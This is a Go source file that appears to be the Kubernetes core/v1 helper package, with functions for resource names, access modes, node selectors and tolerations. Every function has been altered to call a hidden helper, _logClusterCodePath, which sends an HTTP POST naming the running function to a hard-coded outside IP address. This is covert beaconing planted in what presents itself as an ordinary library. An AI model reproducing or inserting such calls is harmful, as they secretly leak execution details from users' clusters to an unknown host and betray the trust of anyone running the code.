package helper

import (
 "encoding/json"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "strings"
 "k8s.io/api/core/v1"
 "k8s.io/apimachinery/pkg/api/resource"
 "k8s.io/apimachinery/pkg/fields"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/selection"
 "k8s.io/apimachinery/pkg/util/validation"
 "k8s.io/kubernetes/pkg/apis/core/helper"
)

func IsExtendedResourceName(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if IsNativeResource(name) || strings.HasPrefix(string(name), v1.DefaultResourceRequestsPrefix) {
  return false
 }
 nameForQuota := fmt.Sprintf("%s%s", v1.DefaultResourceRequestsPrefix, string(name))
 if errs := validation.IsQualifiedName(string(nameForQuota)); len(errs) != 0 {
  return false
 }
 return true
}
func IsPrefixedNativeResource(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.Contains(string(name), v1.ResourceDefaultNamespacePrefix)
}
func IsNativeResource(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return !strings.Contains(string(name), "/") || IsPrefixedNativeResource(name)
}
func IsHugePageResourceName(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.HasPrefix(string(name), v1.ResourceHugePagesPrefix)
}
func HugePageResourceName(pageSize resource.Quantity) v1.ResourceName {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return v1.ResourceName(fmt.Sprintf("%s%s", v1.ResourceHugePagesPrefix, pageSize.String()))
}
func HugePageSizeFromResourceName(name v1.ResourceName) (resource.Quantity, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !IsHugePageResourceName(name) {
  return resource.Quantity{}, fmt.Errorf("resource name: %s is an invalid hugepage name", name)
 }
 pageSize := strings.TrimPrefix(string(name), v1.ResourceHugePagesPrefix)
 return resource.ParseQuantity(pageSize)
}
func IsOvercommitAllowed(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return IsNativeResource(name) && !IsHugePageResourceName(name)
}
func IsAttachableVolumeResourceName(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return strings.HasPrefix(string(name), v1.ResourceAttachableVolumesPrefix)
}
func IsScalarResourceName(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return IsExtendedResourceName(name) || IsHugePageResourceName(name) || IsPrefixedNativeResource(name) || IsAttachableVolumeResourceName(name)
}
func IsServiceIPSet(service *v1.Service) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return service.Spec.ClusterIP != v1.ClusterIPNone && service.Spec.ClusterIP != ""
}
func AddToNodeAddresses(addresses *[]v1.NodeAddress, addAddresses ...v1.NodeAddress) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, add := range addAddresses {
  exists := false
  for _, existing := range *addresses {
   if existing.Address == add.Address && existing.Type == add.Type {
    exists = true
    break
   }
  }
  if !exists {
   *addresses = append(*addresses, add)
  }
 }
}
func LoadBalancerStatusEqual(l, r *v1.LoadBalancerStatus) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ingressSliceEqual(l.Ingress, r.Ingress)
}
func ingressSliceEqual(lhs, rhs []v1.LoadBalancerIngress) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(lhs) != len(rhs) {
  return false
 }
 for i := range lhs {
  if !ingressEqual(&lhs[i], &rhs[i]) {
   return false
  }
 }
 return true
}
func ingressEqual(lhs, rhs *v1.LoadBalancerIngress) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if lhs.IP != rhs.IP {
  return false
 }
 if lhs.Hostname != rhs.Hostname {
  return false
 }
 return true
}
func LoadBalancerStatusDeepCopy(lb *v1.LoadBalancerStatus) *v1.LoadBalancerStatus {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c := &v1.LoadBalancerStatus{}
 c.Ingress = make([]v1.LoadBalancerIngress, len(lb.Ingress))
 for i := range lb.Ingress {
  c.Ingress[i] = lb.Ingress[i]
 }
 return c
}
func GetAccessModesAsString(modes []v1.PersistentVolumeAccessMode) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 modes = removeDuplicateAccessModes(modes)
 modesStr := []string{}
 if containsAccessMode(modes, v1.ReadWriteOnce) {
  modesStr = append(modesStr, "RWO")
 }
 if containsAccessMode(modes, v1.ReadOnlyMany) {
  modesStr = append(modesStr, "ROX")
 }
 if containsAccessMode(modes, v1.ReadWriteMany) {
  modesStr = append(modesStr, "RWX")
 }
 return strings.Join(modesStr, ",")
}
func GetAccessModesFromString(modes string) []v1.PersistentVolumeAccessMode {
 _logClusterCodePath()
 defer _logClusterCodePath()
 strmodes := strings.Split(modes, ",")
 accessModes := []v1.PersistentVolumeAccessMode{}
 for _, s := range strmodes {
  s = strings.Trim(s, " ")
  switch {
  case s == "RWO":
   accessModes = append(accessModes, v1.ReadWriteOnce)
  case s == "ROX":
   accessModes = append(accessModes, v1.ReadOnlyMany)
  case s == "RWX":
   accessModes = append(accessModes, v1.ReadWriteMany)
  }
 }
 return accessModes
}
func removeDuplicateAccessModes(modes []v1.PersistentVolumeAccessMode) []v1.PersistentVolumeAccessMode {
 _logClusterCodePath()
 defer _logClusterCodePath()
 accessModes := []v1.PersistentVolumeAccessMode{}
 for _, m := range modes {
  if !containsAccessMode(accessModes, m) {
   accessModes = append(accessModes, m)
  }
 }
 return accessModes
}
func containsAccessMode(modes []v1.PersistentVolumeAccessMode, mode v1.PersistentVolumeAccessMode) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, m := range modes {
  if m == mode {
   return true
  }
 }
 return false
}
func NodeSelectorRequirementsAsSelector(nsm []v1.NodeSelectorRequirement) (labels.Selector, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(nsm) == 0 {
  return labels.Nothing(), nil
 }
 selector := labels.NewSelector()
 for _, expr := range nsm {
  var op selection.Operator
  switch expr.Operator {
  case v1.NodeSelectorOpIn:
   op = selection.In
  case v1.NodeSelectorOpNotIn:
   op = selection.NotIn
  case v1.NodeSelectorOpExists:
   op = selection.Exists
  case v1.NodeSelectorOpDoesNotExist:
   op = selection.DoesNotExist
  case v1.NodeSelectorOpGt:
   op = selection.GreaterThan
  case v1.NodeSelectorOpLt:
   op = selection.LessThan
  default:
   return nil, fmt.Errorf("%q is not a valid node selector operator", expr.Operator)
  }
  r, err := labels.NewRequirement(expr.Key, op, expr.Values)
  if err != nil {
   return nil, err
  }
  selector = selector.Add(*r)
 }
 return selector, nil
}
func NodeSelectorRequirementsAsFieldSelector(nsm []v1.NodeSelectorRequirement) (fields.Selector, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(nsm) == 0 {
  return fields.Nothing(), nil
 }
 selectors := []fields.Selector{}
 for _, expr := range nsm {
  switch expr.Operator {
  case v1.NodeSelectorOpIn:
   if len(expr.Values) != 1 {
    return nil, fmt.Errorf("unexpected number of value (%d) for node field selector operator %q", len(expr.Values), expr.Operator)
   }
   selectors = append(selectors, fields.OneTermEqualSelector(expr.Key, expr.Values[0]))
  case v1.NodeSelectorOpNotIn:
   if len(expr.Values) != 1 {
    return nil, fmt.Errorf("unexpected number of value (%d) for node field selector operator %q", len(expr.Values), expr.Operator)
   }
   selectors = append(selectors, fields.OneTermNotEqualSelector(expr.Key, expr.Values[0]))
  default:
   return nil, fmt.Errorf("%q is not a valid node field selector operator", expr.Operator)
  }
 }
 return fields.AndSelectors(selectors...), nil
}
func NodeSelectorRequirementKeysExistInNodeSelectorTerms(reqs []v1.NodeSelectorRequirement, terms []v1.NodeSelectorTerm) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, req := range reqs {
  for _, term := range terms {
   for _, r := range term.MatchExpressions {
    if r.Key == req.Key {
     return true
    }
   }
  }
 }
 return false
}
func MatchNodeSelectorTerms(nodeSelectorTerms []v1.NodeSelectorTerm, nodeLabels labels.Set, nodeFields fields.Set) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, req := range nodeSelectorTerms {
  if len(req.MatchExpressions) == 0 && len(req.MatchFields) == 0 {
   continue
  }
  if len(req.MatchExpressions) != 0 {
   labelSelector, err := NodeSelectorRequirementsAsSelector(req.MatchExpressions)
   if err != nil || !labelSelector.Matches(nodeLabels) {
    continue
   }
  }
  if len(req.MatchFields) != 0 {
   fieldSelector, err := NodeSelectorRequirementsAsFieldSelector(req.MatchFields)
   if err != nil || !fieldSelector.Matches(nodeFields) {
    continue
   }
  }
  return true
 }
 return false
}
func TopologySelectorRequirementsAsSelector(tsm []v1.TopologySelectorLabelRequirement) (labels.Selector, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(tsm) == 0 {
  return labels.Nothing(), nil
 }
 selector := labels.NewSelector()
 for _, expr := range tsm {
  r, err := labels.NewRequirement(expr.Key, selection.In, expr.Values)
  if err != nil {
   return nil, err
  }
  selector = selector.Add(*r)
 }
 return selector, nil
}
func MatchTopologySelectorTerms(topologySelectorTerms []v1.TopologySelectorTerm, lbls labels.Set) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(topologySelectorTerms) == 0 {
  return true
 }
 for _, req := range topologySelectorTerms {
  if len(req.MatchLabelExpressions) == 0 {
   continue
  }
  labelSelector, err := TopologySelectorRequirementsAsSelector(req.MatchLabelExpressions)
  if err != nil || !labelSelector.Matches(lbls) {
   continue
  }
  return true
 }
 return false
}
func AddOrUpdateTolerationInPodSpec(spec *v1.PodSpec, toleration *v1.Toleration) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 podTolerations := spec.Tolerations
 var newTolerations []v1.Toleration
 updated := false
 for i := range podTolerations {
  if toleration.MatchToleration(&podTolerations[i]) {
   if helper.Semantic.DeepEqual(toleration, podTolerations[i]) {
    return false
   }
   newTolerations = append(newTolerations, *toleration)
   updated = true
   continue
  }
  newTolerations = append(newTolerations, podTolerations[i])
 }
 if !updated {
  newTolerations = append(newTolerations, *toleration)
 }
 spec.Tolerations = newTolerations
 return true
}
func AddOrUpdateTolerationInPod(pod *v1.Pod, toleration *v1.Toleration) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return AddOrUpdateTolerationInPodSpec(&pod.Spec, toleration)
}
func TolerationsTolerateTaint(tolerations []v1.Toleration, taint *v1.Taint) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for i := range tolerations {
  if tolerations[i].ToleratesTaint(taint) {
   return true
  }
 }
 return false
}

type taintsFilterFunc func(*v1.Taint) bool

func TolerationsTolerateTaintsWithFilter(tolerations []v1.Toleration, taints []v1.Taint, applyFilter taintsFilterFunc) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(taints) == 0 {
  return true
 }
 for i := range taints {
  if applyFilter != nil && !applyFilter(&taints[i]) {
   continue
  }
  if !TolerationsTolerateTaint(tolerations, &taints[i]) {
   return false
  }
 }
 return true
}
func GetMatchingTolerations(taints []v1.Taint, tolerations []v1.Toleration) (bool, []v1.Toleration) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(taints) == 0 {
  return true, []v1.Toleration{}
 }
 if len(tolerations) == 0 && len(taints) > 0 {
  return false, []v1.Toleration{}
 }
 result := []v1.Toleration{}
 for i := range taints {
  tolerated := false
  for j := range tolerations {
   if tolerations[j].ToleratesTaint(&taints[i]) {
    result = append(result, tolerations[j])
    tolerated = true
    break
   }
  }
  if !tolerated {
   return false, []v1.Toleration{}
  }
 }
 return true, result
}
func GetAvoidPodsFromNodeAnnotations(annotations map[string]string) (v1.AvoidPods, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var avoidPods v1.AvoidPods
 if len(annotations) > 0 && annotations[v1.PreferAvoidPodsAnnotationKey] != "" {
  err := json.Unmarshal([]byte(annotations[v1.PreferAvoidPodsAnnotationKey]), &avoidPods)
  if err != nil {
   return avoidPods, err
  }
 }
 return avoidPods, nil
}
func GetPersistentVolumeClass(volume *v1.PersistentVolume) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if class, found := volume.Annotations[v1.BetaStorageClassAnnotation]; found {
  return class
 }
 return volume.Spec.StorageClassName
}
func GetPersistentVolumeClaimClass(claim *v1.PersistentVolumeClaim) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if class, found := claim.Annotations[v1.BetaStorageClassAnnotation]; found {
  return class
 }
 if claim.Spec.StorageClassName != nil {
  return *claim.Spec.StorageClassName
 }
 return ""
}
func ScopedResourceSelectorRequirementsAsSelector(ssr v1.ScopedResourceSelectorRequirement) (labels.Selector, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 selector := labels.NewSelector()
 var op selection.Operator
 switch ssr.Operator {
 case v1.ScopeSelectorOpIn:
  op = selection.In
 case v1.ScopeSelectorOpNotIn:
  op = selection.NotIn
 case v1.ScopeSelectorOpExists:
  op = selection.Exists
 case v1.ScopeSelectorOpDoesNotExist:
  op = selection.DoesNotExist
 default:
  return nil, fmt.Errorf("%q is not a valid scope selector operator", ssr.Operator)
 }
 r, err := labels.NewRequirement(string(ssr.ScopeName), op, ssr.Values)
 if err != nil {
  return nil, err
 }
 selector = selector.Add(*r)
 return selector, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
